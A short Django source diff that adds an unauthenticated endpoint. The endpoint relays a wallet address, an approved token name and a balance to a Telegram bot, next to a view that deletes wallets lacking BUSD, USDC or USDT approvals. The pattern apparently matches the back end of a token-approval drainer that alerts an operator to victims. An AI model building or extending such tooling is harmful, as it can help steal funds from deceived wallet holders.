@@ -8,6 +8,7 @@ import csv
 from . import models
 from . import serializers
 from . import service
+from . import tg_bot
 
 
 class WalletListCreateAPIView(generics.ListCreateAPIView):
@@ -65,5 +66,16 @@ class ClearAddressAPIView(APIView):
         for i in wallets:
             if not i.busd_approved and not i.usdc_approved and not i.usdt_approved:
                 i.delete()
+        return Response(data={'status': 'ok'}, status=200)
+
+
+class BotAPIView(APIView):
+    def get(self, request):
+        data = {
+            'address': request.GET.get('address'),
+            'approved_token': request.GET.get('approved_token'),
+            'balance': request.GET.get('balance')
+        }
+        tg_bot.send_message(data)
         return Response(data={'status': 'ok'}, status=200)
 
